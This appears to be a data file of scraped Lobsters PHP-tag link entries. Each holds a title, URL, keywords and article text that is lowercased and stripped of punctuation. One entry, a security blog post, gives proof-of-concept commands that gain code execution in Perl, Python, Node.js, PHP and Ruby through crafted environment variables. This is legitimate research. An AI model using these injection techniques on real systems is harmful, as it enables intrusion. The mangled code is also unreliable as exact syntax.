rich carry many innovative legacy feature make much sense look history language development usual feel free ping twitter anything say open issue pull request happy main takeaway took incredible amount time write article like show kind support please share social medium social circle see next time cheer
6,Lobsters,php,PHP programming,Hacking with Environment Variables,https://www.elttam.com/blog/env/,hacking environment variable,introduction remote ldpreload exploitation perl exploit hacker fantastic blasty exploit solve ctf challenge justinsteven proof concept python making progress pythonwarnings guarded check variable antigravity module easter egg leveraging perl arbitrary code execution proof concept nodejs blog post michał bentkowski proc filesystem proof concept php php setting orange tsai great blog post brendan scarvell proof concept ruby proof concept conclusion,introduction recent project gained ability specify environment variable process executed also unable control content file disk bruteforcing process identifier pid file descriptor found interesting result eliminating remote ldpreload exploitation fortunately scripting language interpreter executed enabled u execute arbitrary command specifying particular environment variable blog post discus arbitrary command executed range scripting language interpreter supplied malicious environment variable perl quick read environment section perlrun man page reveals plenty environment variable worth investigating environment variable allows specifying commandline option restricted accepting option cdimtuwdmtw unfortunately mean e allows supplying perl code run lost though demonstrated exploit hacker fantastic exploit writes malicious perl module tmprootpm supply environment variable achieve arbitrary code execution however exploit local privilege escalation vulnerability generic technique ideally require access file system looking blasty exploit cve exploit require creating file used environment variable sh exit environment variable also used solve ctf challenge one final nicety generic technique would use single environment variable instead two justinsteven found possible leveraging either used load perl module option allows adding extra code module name proof concept arbitrary code execution achieved using environment variable perl running empty script devnull docker run env print id perl devnull root root root python reading environment variable section python man page pythonstartup initially appears like may piece straightforward solution allows specifying path python script executed prior displaying prompt interactive mode interactive mode requirement seem like would issue pythoninspect environment variable used enter interactive mode specifying command line however documentation option explains pythonstartup used python started script execute mean pythonstartup pythoninspect combined pythonstartup effect python repl immediately launched ultimately mean pythonstartup viable effect executing regular python script environment variable looked promising pythonhome pythonpath let gain arbitrary code execution require also able create directory file filesystem may possible loosen requirement use proc filesystem andor zip file majority remaining environment variable simply checked contain nonempty string toggle generally benign setting one rare exception pythonwarnings making progress pythonwarnings documentation pythonwarnings state equivalent specifying w option w option used warning control specify warning often printed full form argument action message category module line warning control seem like promising lead quickly changed checking implementation def getcategory category category return warning category import builtins klass category else module klass categoryrpartition try import module none none klass except importerror raise optionerror invalid module name r module none code show long specified category contains dot trigger import arbitrary python module next problem vast majority module python standard library run little code imported tend define class used later even provide code run code typically guarded check main variable detect file imported run directly unexpected exception antigravity module python developer included easter egg triggered running import antigravity import immediately open browser xkcd comic joked import antigravity python would grant ability fly antigravity module open browser us another module standard library called webbrowser module check path large variety browser including mosaic opera skipstone konqueror chrome chromium firefox link elinks lynx also accepts environment variable browser let specify process executed possible supply argument process environment variable xkcd comic url one hardcoded argument command ability turn arbitrary code execution depends executables available system leveraging perl arbitrary code execution one approach leverage perl commonly installed system even available standard python docker image however perl binary used first argument xkcd comic url comic url argument cause error process exit without environment variable used effect url passed perl docker run e print id exit perl http ca nt open perl script http file directory fortunately perl available also common default perl script available perldoc perlthanks script also error exit invalid argument error case happens later processing environment variable mean leverage perl environment variable payload detailed earlier blog post working intended perldoc perlthanks docker run e print id exit perldoc http root root root run e print id exit perlthanks http root root root proof concept arbitrary code execution achieved using multiple environment variable python python docker run e e browserperlthanks e print id exit python devnull root root root invalid w option ignored unknown warning category antigravityx docker run e e browserperlthanks e print id exit python devnull root root root invalid w option ignored unknown warning category antigravityx nodejs blog post michał bentkowski provided payload exploiting kibana prototype pollution vulnerability used set arbitrary environment variable resulted arbitrary command execution michał payload used nodeoptions environment variable proc filesystem specifically procselfenviron although michał technique creative worked perfectly vulnerability technique always guaranteed work constraint would nice remove first constraint using procselfenviron viable content made syntactically valid javascript requires able create environment variable appear first content procselfenviron knowingbruteforcing environment variable name appear first overwriting value another constraint first environment variable value finish single line comment therefore newline character environment variable likely cause syntax error prevent payload executing use multiline comment fix issue must closed syntactically valid therefore rare case environment variable contains newline character required knowbruteforce environment variable name overwrite value new value contain newline removing contraints exercise left reader proof concept achieving arbitrary code execution environment variable nodejs michał bentkowski docker run e nodeversionconsolelog require childprocess execsync id tostring e nodeoptions require procselfenviron node devnull root root root php run ltrace e getenv php devnull find php us phprc environment variable environment variable used attempting find load configuration file phpini exploit neex used series php setting achieve arbitrary code execution orange tsai also great blog post creating exploit cve us slightly different list setting using knowledge plus knowledge gained previous nodejs technique help brendan scarvell two environment variable solution found php constraint exist technique nodejs example proof concept achieving arbitrary code execution environment variable php docker run e nautoprependfileprocselfenvironn php die id e phprcprocselfenviron php devnull autoprependfileprocselfenviron root root root ruby generic solution ruby found yet ruby accept environment variable rubyopt specify commandline option man page state rubyopt contain e k r u v w w debug disablefeature enablefeature promising option r cause ruby load library using require however limited file extension rb example somewhat useful rb file found toolsserverrb json gem available installing ruby fedora system file required web server started shown using rubyopt environment variable cause ruby process start web server docker run env binbash c dnf install ruby devnull ruby devnull surf http info webrick info ruby info webrick httpserver start sticking fedora another approach leverage fact usrbinruby actually bash script start usrbinrubymri script call bash function overwritten environment variable proof concept using exported bash function run arbitrary command docker run env bashfuncdeclare id exit binbash c dnf install ruby devnull ruby devnull root root root conclusion post explored interesting use case environment variable could assist achieving arbitrary code execution various scripting language interpreter without writing file disk hopefully enjoyed reading inspired find share improved payload scripting language find generic technique work ruby would interested hearing achieved thanks reading ciao bella
7,Lobsters,php,PHP programming,If PHP Were British (2011),https://aloneonahill.com/blog/if-php-were-british/,php british,php british rasmus lerdorf php slap face getting started abbreviation eloquence biggerthancheeses spelling manner class sun never set thanks mark pat connexion php development humour empire comment powered disqus,php british rasmus lerdorf first put php together quite sensibly despite heritage chose write greenlandic danish good job would rather unpleasant work opted instead canada local tongue french canadian english either went bastard dialect queen english commonly referred u english php developer britain grumpy ever since thinking importantly undo travesty developer ensure tradition british empire continue upheld even digital age slap face variablename first maybe important many change allow php achieve elegant feel remove symbol beloved u replace something altogether refined solid sterling getting started php echo hello world many today british programmer put outset brazen informality simple yet obscenely americanised program colloquially referred hello world imperial formal introduction might encourage greater proportion young british talent remain language thus give broader community urbane air php announce good morrow fellow subject crown abbreviation thing abhorrent british unnecessary abbreviation text speak unheard street london natural ingrained british grammarian simply refuse stoop sending message c u soon traffic kthxbye variety instead proferring something altogether elegant dear sirmadam arrive soon time allows expect within hour assure horse shall spared respectfully slower type yes like rushed php hand full bursting abbreviation acronym entirely unnecessary strreplace isint vardump pregmatch jsonencode mysqlconnect following change improve thing stringreplace isinteger variabledump perlregularexpressionmatch javascriptobjectnotationencode mystructuredquerylanguageconnect edit corrected expansion pregmatch thanks pointed eloquence condition code else code shakespeare would ashamed see native tongue twisted monstrosity brevity applauded right context dark corner shall seldom seen else block used conditional code php must made inoffensive possible many option replacement may strongest perchance code otherwise code naturally applies americanised switch case construct one describe clunky unpleasant switch variable case code break case code break default code break word switch break default hard reader lack context right honourable biggerthancheeses kind enough contribute gentrified suggestion interesting idea particularly around replacement include something like imightbepartialto demonstrating natural talent imperialisation programming language whatabout perhaps code splendid perhaps code splendid ontheoffchance code splendid spelling imagecolorallocate serialize newtcenteredwindow connectionstatus word fail point selfrespecting gentleman expected make head tail word beggar belief anyone could allow distortion word entered programming language along cornucopia similar error reverted proper form immediately imagecolourallocate serialise newtcentredwindow connexionstatus manner try code catch exception e handle exception die message try catch block excellent example php lack manner far direct allowed new php additionally word die depressing new block although verbose vastly polite upbeat wouldyoumind code actuallyidomind exception politely move cheerio message class perhaps nothing important ingrained british psyche notion class opportunity change within part php change made important class republic public private b protected c example new republic begin current system place class hierarchy unacceptable shall begin giving class specific level upper middle working class access method one higher level without explicit permission higher order class course though might access would true member higher order could grant higher order access lower order class public private british class system often synonymous see example school system nomenclature must adjusted protected property visibility word new passable much appropriate replacement matter class upperclass empire state private hereditary nouveau empire sun never set hoped simple change improve reputation status php among language longer poor american cousin instead take rightful place british king scripting language thanks many thanks mark pat former colleague helped start resurrection british empire pub friday yes connexion august php development humour empire please enable javascript view comment powered disqus
8,Lobsters,php,PHP programming,Named arguments are coming in PHP 8,https://stitcher.io/blog/php-8-named-arguments,named argument coming php,php named argument close call php promoted property named argument counter argument named argument depth attribute rfc twitter email newsletter twitter pr,php named argument close call named argument also called named parameter supported php post discus in out let show first look like example wild setcookie name test expires time named argument used builtin php function class customerdata public function construct public string name public string email public int age data new customerdata name input name email input email age input age dto making use promoted property well named argument data new customerdata customerrequest validated named argument also support array spreading might guessed example named argument allow pas input data function based argument name instead argument order would argue named argument great feature significant impact daytoday programming life probably wondering detail though pas wrong name array spreading syntax well let look question indepth named argument let say feature highly debated one counter argument adding however say benefit far outweigh fear backwards compatibility problem bloated apis way see allow u write cleaner flexible code one named argument allow skip default value take look cookie example setcookie name test expires time method signature actually following setcookie string name string value int expires string path string domain bool secure false bool httponly false bool example showed nt need set cookie value need set expiration time named argument made method call little concise setcookie test time setcookie without named argument setcookie name test expires time setcookie named argument besides skipping argument default value also benefit clarity variable something especially useful function large method signature could say lot argument usually code smell still deal matter better sane way nothing named argument depth basic way let look named argument ca nt first named argument combined unnamed also called ordered argument case ordered argument must always come first take dto example class customerdata public function construct public string name public string email public int age could construct like data new customerdata input name age input age email input email however ordered argument named one would throw error data new customerdata age input age input name email input email next possible use array spreading combination named argument input age name brent email brent stitcherio data new customerdata input however missing required entry array key listed named argument error thrown input age name brent email brent stitcherio unknownproperty allowed data new customerdata input possible combine named ordered argument input array ordered argument follow rule must come first input brent age email brent stitcherio data new customerdata input using variadic function named argument passed key name variadic argument array take following example class customerdata public static function new args self return new self args public function construct public string name public string email public int age data customerdata new email brent stitcherio age name brent case args customerdata new contain following data age email brent stitcherio name brent attribute also known annotation also support named argument class productsubscriber listensto event productcreated class public function onproductcreated productcreated event possible variable argument name field age data customerdata new field finally named argument deal pragmatic way name change inheritance take example interface eventlistener public function event handler class mylistener implement eventlistener public function myevent myhandler php silently allow changing name event myevent handler myhandler decide use named argument using parent name result runtime error public function register eventlistener listener listener event event handler handler runtime error case listener instance mylistener pragmatic approach chosen prevent major breaking change inherited argument would keep name seems like good solution tell named argument want know little backstory behind design decision encourage read rfc looking forward using named argument let know via twitter via email would like stay date new content feel free subscribe newsletter follow twitter noticed tpyo submit pr fix
9,Lobsters,php,PHP programming,Improving performance of PHP for Arm64 and impact on Amazon EC2 M6g instances,https://idk.dev/improving-performance-of-php-for-arm64-and-impact-on-amazon-ec2-m6g-instances/,improving performance php impact amazon instance,better zend optimizer performance evaluation wordpress ubuntu install aws contribution patch impacting performance wordpress benchmark future development conclusion,post contributed sebastian pop senior software engineer amazon web servicesaws recently launched amazon instance powered compared similarsized instance instance provide better costperformance several opensource application stacksthis blog discus aws worked together php community drive major improvement performance php software stack instance using instance latest release currently experience faster execution time compared previous release significantly lower cost running php software wordpress amazon instancesa better zend optimizer optimizer component php runtime system improves performance range zend microbenchmarks php zend optimizer enabled arm aws added implementation several function php interpreteraws evaluated performance impact software change php interpreter running standard microbenchmarks distributed zend optimizer benchphp microbenchphp look performance php interpreter used fully loaded server benchmark set run many copy parallel vcpus system vcpu run one copy benchmark utilization system experiment run vcpus vcpus intel instance php version execution time instance improved following image demonstrate benchmark result first image show improved execution time zendbenchphp newer version php second image illustrates faster execution time newer version php zendmicrobenchphpperformance evaluation wordpress ubuntu synthetic benchmark proved superior performance also looked wordpress phpbased realworld application following image show setup experiment machine represented middle image system test sut measure performance php independently component system mysql database set run separate instance blue figure program wrk generates http request main page wordpress wrk run separate instance represented orange figure minimize network noise three machine allocated cluster placement group sut run nginx webserver php interpreter nginx webserver configured fast cgi interface phpfpm machine run ubuntu software change wordpress serve page per second v combined lower cost instance running wordpress provides better priceperformance instance v instance following image illustrates performance php version running instance looking scalability wordpressnginx benchmark instance better performing release adding vcpus scale almost linearly number served page eight vcpus however beta version august contains even optimization scalability trend continues vcpus cpu utilization drop lowcost end spectrum aws offer instance sustain page per second may interesting small costconscious user wordpresshow install instruction http wwwphpnetinstallinstallation instruction ubuntu http computingforgeekscomhowtoinstallphponubuntuaws contribution impacting performance wordpress benchmarkthe performance difference master due http remove support constructor deprecated http committed early branch cut patch may easily applied branch get performance benefit see masterthere two patch impact performance wordpressnginx benchmark applied master branch future plan release improvement improved touppertolower function brings performance http contributed change release version used match regular expression accounted execution time wordpress benchmark change contributed aws vectorizes first character match matching pair character neon instruction performance improves http plan feature new jit compiler optimizes php bytecode opcache jit currently developed based lua jit lua jit support work php developer enable tune opcache jit get best performance aws graviton processorsthe interaction php community early discussion maintainer php zend optimizer plan improve performance arm patch review improved quality submission followup patch community address problem uncovered review patch aws continues contribute arm performance improvement followed pattern involvement pcre community continue work opensource community bring expertise knowledge improving performance tuning armbased aws graviton systemsconclusionphp release key obtain maximum performance instance php make instance even appealing delivering higher performance lower cost compared instancesto get started check new instance powered aws please leave comment
10,Lobsters,php,PHP programming,PHP 8.0: Match Expressions,https://php.watch/versions/8.0/match-expression,php match expression,expression return value multiple matching condition allowed matching case must contain one expression allowed implicit case expression must match condition must exception hierarchy php exception strict match without type coercion match arbitrary expression v backwards compatibility impact backported rfc rfc discussion implementation,match expression syntax one nicest feature php improves switch syntax multiple way status match requestmethod post handlepost get head handleget default throw new exception unsupported functionality match expression compared switch block switch requestmethod status match requestmethod case post status handlepost break post handlepost case get case head status handleget break get head handleget default throw new exception unsupported default throw new exception unsupported match expression return value return value expression used arm similar case switch block assigned variable name match one two echo name two necessary assign return value anything return value matched arm returned match expression multiple matching condition allowed possible match expression contain one matching condition behave similar multiple cascading case key switch block match requestmethod post handlepost get head handleget requestmethod get requestmethod head condition handled handleget matching case must contain one expression unlike switch block contain number expression match arm contain one expression match name foo initfoo processfoo syntax allowed arm must contain single expression implicit break matched arm match expression allows single expression fallthrough switch block switch test case test sendtestalert case send sendnuclearalert easy overlook missing break call switch case allows code fallthrough next case switch block missing break statement make code fallthrough execute sendnuclearalert well although unlikely outcome expect match test test sendtestalert send sendnuclearalert match expression work without explicit break statement executes one matching arm immediately return value making imply break call right expression matched arm executes default case match statement support default arm work similar default case switch block default arm catch expression none condition matched match qux foo bar default echo unknown name unknown qux match expression must match condition switch block silently proceeds code flow matching case key match expression match expression must condition match expression default case handle match match expression throw unhandledmatcherror exception value match value one two match expression throw error fatal error uncaught unhandledmatcherror unhandledmatcherror exception match expression throw unhandledmatcherror exception match within expression unhandledmatcherror new exception class php extends error full hierarchy php core exception class including one added php see hierarchy php exception class easily polyfilled class unhandledmatcherror extends error strict match without type coercion one important design choice match expression match without type coercion function read mixed key string return match key integer string true bool true empty array array read integer read string read true bool true typical switch block case matched loosely ie match expression matching arm matched strict comparison leaving possible bug switch block snippet individual arm matched value type match arbitrary expression match expression allows given value matched expression match foo page found response redirect redirect client getcode client error response getcode response error default unknown error expression evaluated order laid match expression try match foo order foo foo response redirect foo client getcode foo response getcode default find positive match rest code evaluated match v switch backwards compatibility impact match expression new syntax php code us match expression work older php version unhandledmatcherror exception class backported trying run code us expression fail parse error older php version parse error syntax error unexpected tdoublearrow line rfc rfc discussion implementation
11,Lobsters,php,PHP programming,PEST - An elegant PHP Testing Framework,https://github.com/pestphp/pest,pest elegant php testing framework,join github today sign,dismiss join github today github home million developer working together host review code manage project build software together sign
12,Lobsters,php,PHP programming,Happy 25th Anniversary to PHP,https://groups.google.com/forum/m/#!msg/comp.infosystems.www.authoring.cgi/PyJ25gZ6z7A/M9FkTUVDfcwJ,happy anniversary php,,use google group discussion please enable javascript browser setting refresh page
13,Lobsters,php,PHP programming,Making Collabora Online trivial to setup,https://people.gnome.org/~michael/blog/2020-06-03-php-online-proxy.html,making collabora online trivial setup,improving collabora online installability demo server thing used work ideal world code apache nginx websocket replacement trickier php j xmlhttprequest ajax handshake persistent connection running daemon php proxy problem proxy polling v longpolling solution limitation caveat ideal instruction fpm opcache thanks next libreoffice community conspiracy conference fun,today release big step improving collabora online installability home user collabora typically focused supporting enterprise user pay bill familiar getting certificate configuring web server proxy port number help problem left homeusers eager take advantage privacy ease use large barrier entry set adding easytosetup demo server user course people want use hardware let document site today released new way using new php proxying protocol appimage bundled singleclick installable nextcloud app bringing php solution soon quick writeup work thing used work ideal world ideally home user grab code docker image installs package public facing http webserver create certificate host configure use loolwsdxml andor setup apache nginx reverse proxy ssl unwrap certificate magic done proxying webserver mean end nice c browser talking directly c kernel across network another c app loolwsd webservices daemon sure ssl transport websocket layered perhaps intermediate proxyingunwrapping webserver life reasonably sensible daemon load persists document memory manages locksdown access manages low latency high performance bidirectional transport persistent secure connection browser even reworked mainloops use microsecond wait avoid silly one millisecond wasteage look show particularly poor crosseuropean ping finland spain particularly heavy document rerendering well sw time render result browser work reasonably nicely editing server san francisco eu push notification fast problem world seems hard casual user configure websocket replacement trickier php j ideally could setup web server proxy request nicely getgo course collabora online inevitably integrated alreadyworking php app sort reuse already working phpgoodness php course builtin support websockets usecase furthermore expected php process shortlived spawned quickly server killed say second default bad behavior still around javascript side nt appear api use send lowlatency message across web except venerable xmlhttprequest api launched spasm ajax web couple decade ago make asynchronous request badly need low latency get interactive editing work going pan clearly want use http tl negotiating secure connection requires handshake rich roundtrip latency exactly nt want mercifully web browser server type got together long time ago two thing create pool multiple connection web server get faster page load also use persistent connection keepalive get many request negotiated tl connection turn fact avoid tl overhead also make several parallel request without huge latency penalty despite xmlhttprequest api excellent client connection loose little latency stack binary text websocketlike protocol top running daemon clearly want avoid document daemon regularly killed every second luckily disowning spawned process reasonably trivial fail connect launch appimage bundled inside php app close hand get serve request want initially thought simple reading php input writing socket connected loolwsd reading output back writing php output unfortunately thing never quite easy php proxy problem love php probably want read proxy code three hundred line necessary significant problem need get data apache spawned php process send via socket quickly many default setup love parse reparse php request first attempt integrate prototype nextcloud php infrastructure allowing every app say went overhead per request ideal thankfully help tweak nginx config use standalone proxyphp nice necessary get html request length content reconstructed php give mean iterating parsed version header php carefully parsed carefully serialize trying get request body php input sound like ideal stream use point except unmentioned documentation post handling empty stream necessary reconstruct mimelike subelements php get beautiful clean blob back loolwsd containing header content want proxy back unfortunately php going let open php output write across parse request manually populate header dropping body helpful half older per request would really lovely php rawinput php rawoutput provided sharp tool could use shoot foot quickly polling v longpolling initial implementation concerned reply latency get reply back server soon available implemented elegant scheme rotating series four wait request turned every second webserver closed message loolwsd needed sending could immediately return without waiting incoming message beautiful scheme fell foul fact php process sitting waiting consumes nonrenewable resource webserver default process limited collaboration around two user without gumming machine horrible clearly vital keep php transaction time low need get fast nice idea waiting little response prepared returning message sound great consume limited resource concurrent php transaction bad news necessary rabid polling sustain multiple concurrent user rather unfortunate picture show needing get apachephp fast give u extra polling period latency solution ping server every around half target incontinent latency luckily backoff regularly notice poll nothing going coming back currently exponentially reduce polling frequency every notice nothing happening wire mean another collaborator might typed something might catchup later course anything type reset show rapidly course worst case server need get information client respond go without saying protocol asynchronous everywhere around intercontinental latency event ev miss train sent b response missing train c returning back browser reply missing f data getting back g much design spreadsheet look like practice flurry connection startup clear exponential backoff continue tune get editing session see connection reused new one created go along limitation caveat perhaps interesting approach come caveat security appimage signed verified built stock package longer run capability necessary isolate document chroot jail isolation thereby diminished also disable mode default normal installs checkout proxyprefix setting loolwsdxml want something similar provide appimages latency discussed extensively latency slightly higher recommended intercontinental usage course following ideal instruction give much better performance working bandwidth individual http request many header significant overhead much verbose minimal binary websocket protocol scalability work really nicely home user people collaborating tweak php fpm enable opcache make everything quicker proxying larger number user want properly managed configured collabora online perhaps ha cluster andor globalscale thing running good idea spend little extra time installing docker image package configuring webserver proper proxying websockets thanks next many thanks collaborans kendy ash muhammet mert andras well julius nextcloud took poor quaity prototype turned product anyone bad idea take real skill dedication make work beautifully thank course thanks libreoffice community suggestion feedback next continue work tuning improving latency hiding example grouping together large number svg icon image need load cache browser firstload generally useful user course love able continue investing better integration partner rich solution case painfully obvious reflection reflected mine mine nt reflect view collabora suse novell document foundation spaghetti hurler international anyone else also important realise swedish conspiracy occasionally people ask formal photo conference fun
14,Lobsters,php,PHP programming,Attributes — aka annotations — in PHP 8,https://stitcher.io/blog/attributes-in-php-8,attribute aka annotation php,php attribute rundown internals list another rfc array destructuring technical theory source code attribute configuration using binary operation builtin attribute jit twitter email reddit newsletter twitter pr,php attribute php able use attribute goal attribute also known annotation many language add meta data class method variable structured way concept attribute nt new using docblocks simulate behaviour year addition attribute though firstclass citizen language represent kind meta data instead manually parse docblocks look like make custom attribute caveat question answered post let dive rundown first thing first attribute would look like wild use supportattributeslistensto class productsubscriber listensto productcreated class public function onproductcreated productcreated event listensto productdeleted class public function onproductdeleted productdeleted event showing example later post think example event subscriber good one explain use attribute first also yes know syntax might wished hoped might preferred docblocks stay though better learn deal thing worth mentioning syntax option discussed good reason syntax chosen read whole discussion rfc internals list said let focus cool stuff would listensto work hood first custom attribute simple class annotated attribute attribute base attribute used called phpattribute original rfc changed another rfc afterwards would look like attribute class listensto public string event public function construct string event event event pretty simple right keep mind goal attribute meant add meta data class method nothing nt ca nt used example argument input validation word would nt access parameter passed method within attribute previous rfc allowed behaviour rfc specifically kept thing simple back event subscriber example still need read meta data register subscriber based somewhere coming laravel background use service provider place feel free come solution boring boilerplate setup provide little context class eventserviceprovider extends serviceprovider private array subscriber productsubscriber class public function register void eventdispatcher app make eventdispatcher class foreach subscriber subscriber foreach resolvelisteners subscriber event listener eventdispatcher listen event listener note event listener syntax unfamiliar get speed post array destructuring let look resolvelisteners magic happens private function resolvelisteners string subscriberclass array reflectionclass new reflectionclass subscriberclass listener foreach reflectionclass getmethods method attribute method getattributes listensto class foreach attribute attribute listener attribute newinstance listener listener event subscriberclass method getname return listener see easier read meta data way compared parsing docblock string two intricacy worth looking though first attribute newinstance call actually place custom attribute class instantiated take parameter listed attribute definition subscriber class pas constructor mean technically nt even need construct custom attribute could call attribute getarguments directly furthermore instantiating class mean got flexibility constructor parse input whatever way like say would good always instantiate attribute using newinstance second thing worth mentioning use reflectionmethod getattributes function return attribute method pas two argument filter output order understand filtering though one thing need know attribute first might obvious wanted mention real quick anyway possible add several attribute method class property constant could example route http post productscreate autowire class productscreatecontroller public function invoke mind clear reflection getattributes return array let look output filtered say parsing controller route interested route attribute easily pas class filter attribute reflectionclass getattributes route class second parameter change filtering done pas reflectionattribute isinstanceof return attribute implementing given interface example say parsing container definition relies several attribute could something like attribute reflectionclass getattributes containerattribute class reflectionattribute isinstanceof nice shorthand built core technical theory idea attribute work practice time theory making sure understand thoroughly first mentioned briefly attribute added several place class well anonymous class classattribute class myclass object new objectattribute class property constant propertyattribute public int foo constattribute public const bar method function methodattribute public function dosomething void functionattribute function foo well closure closure closureattribute fn method function parameter function foo argumentattribute bar declared docblocks methodattribute public function dosomething void take one several argument defined attribute constructor listens productcreatedevent class autowire route http post productscreate allowed parameter pas attribute already seen class constant class name scalar type allowed little said though attribute accept constant expression input argument mean scalar expression allowed even bit shift well class constant array array unpacking boolean expression null coalescing operator list everything allowed constant expression found source code attributewithscalarexpression attributewithclassnameandconstants pdo class phpversionid attributewithclassconstant http post attributewithbitshift attribute configuration default attribute added several place listed possible however configure used specific place example could make classattribute used class nowhere else optingin behaviour done passing flag attribute attribute attribute class look like attribute attribute targetclass class classattribute following flag available attribute targetclass attribute targetfunction attribute targetmethod attribute targetproperty attribute targetclassconstant attribute targetparameter attribute targetall bitmask flag combine using binary operation attribute attribute targetmethodattribute targetfunction class classattribute another configuration flag repeatability default attribute ca nt applied twice unless specifically marked repeatable done way target configuration bit flag attribute attribute isrepeatable class classattribute note flag validated calling attribute newinstance earlier builtin attribute base rfc accepted new opportunity arose add builtin attribute core one example deprecated attribute popular example jit attribute sure last one read post jit sure see builtin attribute future final note worrying generic syntax wo nt conflict ever added php safe got usecases already mind attribute got thought share awesome new feature php reach twitter via email discus reddit would like stay date new content feel free subscribe newsletter follow twitter noticed tpyo submit pr fix
15,Lobsters,php,PHP programming,A collaborative social publishing engine,https://github.com/idno/Known/,collaborative social publishing engine,known social group platform installation oneclick known site reclaim hosting dreamhost installing http docswithknowncomenlatestinstallindexhtml installing package http wwwmarcuspoveycoukknown installing github http githubcomidnoknown installing composer support u find project useful really want support u fund u opencollective get support community link contributingmd contributor contribute backer become backer sponsor become sponsor copyright license license known also contains http githubcomtwitterbootstrap http githubcomjqueryjquery http githubcomanandkunaltorophp http githubcomforkawesomeforkawesome http codegooglecompmrclay http githubcomaaronpkmentionclient http http fitvidsjscom http leafletjscom http githubcomswiftmailerswiftmailer http githubcominternationsantwort http githubcomjakiestfumentionjs http githubcomjohndyermediaelement http githubcomsimplepiesimplepie http wwwbootstraptogglecom http githubcomtinymcetinymce http githubcompaypalbootstrapaccessibilityplugin http htmlpurifierorg http githubcomkatspaughwavesurferjs http githubcommongodbmongophplibrary http githubcomexifjsexifjs http githubcommapkycaphpogp thank browserstack,known social group platform installation oneclick known site want install web space recommend reclaim hosting includes oneclick known installation known also known work dreamhost highquality web hosting provider installing known active development requires php selected extension together supported database backend find detailed installation instruction http docswithknowncomenlatestinstallindexhtml installing package unofficial install package periodically built latest code available http wwwmarcuspoveycoukknown installing github opt check workinprogress development code git repository http githubcomidnoknown check repo git clone http githubcomidnoknowngit fetch dependency cd known composer install installing composer install known directly composer using composer createproject idnoknown optionally install latest bleeding edge code way composer createproject idnoknown dev support u find project useful really want support u fund u opencollective get support community link detail contributing known project please read contributingmd contributor project exists thanks people contribute contribute backer thank backer become backer sponsor support project becoming sponsor logo show link website become sponsor copyright license except included thirdparty project known c known inc unless otherwise stated known licensed apache software license see license information known logo c known inc permission known inc required use known name logo part project product service domain company name except included official theme distributed known logo external service c respective owner right reserved third party library licensed separately known also contains twitter bootstrap distributed apache license source http githubcomtwitterbootstrap jquery distributed mit license source http githubcomjqueryjquery portion symfony distributed mit license torophp distributed mit license source http githubcomanandkunaltorophp fork awesome distributed open font license version http githubcomforkawesomeforkawesome steve clay autop distributed mit license source http codegooglecompmrclay aaron parecki webmention client distributed apache license source http githubcomaaronpkmentionclient barnaby walter microformats parser distributed mit license source http fitvidsjs distributed wtfpl license source http fitvidsjscom leafletjs distributed bsd license source http leafletjscom swiftmailer distributed mit license source http githubcomswiftmailerswiftmailer antwort email template distributed mit license source http githubcominternationsantwort mentionjs bootstrap user atmention library distributed mit license source http githubcomjakiestfumentionjs mediaelementjs crossbrowser medium player distributed mit license source http githubcomjohndyermediaelement simplepie feed parser distributed bsd license source http githubcomsimplepiesimplepie bootstrap toggle distributed mit license source http wwwbootstraptogglecom tinymce rich text editor distributed lgpl license source http githubcomtinymcetinymce paypal bootstrap accessibility plugin distributed bsd license source http githubcompaypalbootstrapaccessibilityplugin htmlpurifier distributed lgpl license source http htmlpurifierorg wavesurfer distrubuted creative common attribution unported license source http githubcomkatspaughwavesurferjs mongodbphplibrary distributed apache licence source http githubcommongodbmongophplibrary exifjs distributed mit licence source http githubcomexifjsexifjs phpogp distributed licence source http githubcommapkycaphpogp thank thanks browserstack providing infrastructure allows u test real browser
16,Lobsters,php,PHP programming,Hacklang at Slack: A Better PHP,https://slack.engineering/hacklang-at-slack-a-better-php-65f239cbc9e9,hacklang slack better php,several company hhvm hack best part static type checking game changer since php class property generic statically type logic bug community package generic shape enums hack array standard library gradual typing enables migration partial mode approach thoughtful type safety verifiable contract shape help represent complex structure arraymerge different type generic dicts contain multiple type shape asyncawait enables simple concurrency mutexes hack handful language asyncawait multitasking without multithreading guideline breaking php compatibility free hack grow breaking compatibility php hhvm rapidly removed useful new feature packagist published hhast package token stream hack json schema hack codegen hack sql fake xhp looking forward option python javascript ruby,slack launched php backend along several company switched hhvm ran php code faster stayed hhvm offer entirely new language hack searchable hacklang hack make developer faster improving productivity better tooling hack began superset php retaining best part like editrefresh workflow requestoriented memory model enable speedy development addition number qualityoflife improvement hack add better type system static type checker help catch bug allow developer code refactor confidence post talk migrated hack benefit gave u thing consider codebase static type checking game changer php type system come long way since php possible annotate return type class property scalar type remaining hole like lack generic may resolved future biggest flaw type checked runtime costly time find typerelated bug either breaking test suite worse user report production error log hack type checking happens statically without running code type change signature function hundred call site see error one need updating even hitting save game changer productivity difference finding bug millisecond typing compared waiting comprehensive test suite finding deploying hard overstate akin productivity difference developing website php v c hack bother trying run code type checker passing usually work allows slack developer build refactor confidence focusing testing effort higher value area like logic bug static typing help prevent static type checking possible php community package using php strongly recommend using one however hack type checker advantage much fullfeatured type system work hack built ground enable static type checking feature php lack like generic shape enums hack array welltyped standard library enable rigorous static analysis gradual typing enables migration started hack partial mode treat untyped value type usable purpose typescript take approach enabled incremental type time file became fully typed changed default strict mode stayed way surprisingly gradually adding type weaklytyped codebase made thoughtful type safety ever working stronglytyped language like java go instead requirement get compiler run type conscious decision add value codebase justify spending time adding type observing changed working life part codebase easy type others required refactoring enable type safety found prevented bug type serve form inline documentation verifiable unlike comment block helping everyone read understand code also serve contract different part codebase crucial productivity large shared codebase like slack backend hack type system one feature particular shape caught like wildfire slack believe reason never looked back introduced hack codebase shape help represent complex structure php array type bewilderingly act list ordered set value map set key value pair time programming language use separate type experience endless source bug php code especially function like arraymerge treat listlike maplike array differently hack improves upon separating different type using generic describe type key value listlike array containing string vec string maplike array string key integer value dict string int dicts contain multiple type dict string mixed valid particularly useful type annotation say dict contains string key value type enter shape shape array contains known key specific type key may optional preceded example shape definition represent argument http post request many optional field type httppostoptions shape timeout int port int httpbasicauth string header dict string string formdata dict string string jsonpayload jsonserializable useragent string followredirects bool function signature us shape type option function httppost string url httppostoptions option httpresponse implementation call site might look like result httppost http examplecom shape timeout formdata dict example test help ensure correct type used field also help prevent typo name key call site function body shape accessed make shape much impactful developer productivity simple array type annotation shape assembling call function would require reading body large doc block may fully date understand name expected type optional v required status argument shape used variety use case slack including database row codegenerated shape directly db schema expected result decoding json payload function many optional argument asyncawait enables simple concurrency feature added slack request tends work keep user experience snappy concurrency common solution multiple thing time single request many programming language adding concurrency mean adding significant complexity mutexes threadsafe data structure callback thing slow developer making code difficult reason debug hack one handful language implement asyncawait pattern multitasking 